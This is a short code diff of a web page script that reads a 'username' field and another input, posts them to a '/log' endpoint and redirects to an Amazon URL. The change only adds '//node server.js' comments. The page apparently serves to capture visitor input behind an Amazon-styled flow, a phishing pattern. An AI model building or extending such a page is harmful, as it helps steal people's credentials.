@@ -8,9 +8,9 @@
 <body>
     <script>
         function logInput() {
-            window.location.href = "https://www.amazon.com/ref=nav_logo";
-            const username = document.getElementById('username').value;
-            const userInput = document.getElementById('userInput').value;
+            window.location.href = "https://www.amazon.com/ref=nav_logo"; //node server.js
+            const username = document.getElementById('username').value; //node server.js
+            const userInput = document.getElementById('userInput').value; //node server.js
 
             fetch('/log', {
                 method: 'POST',
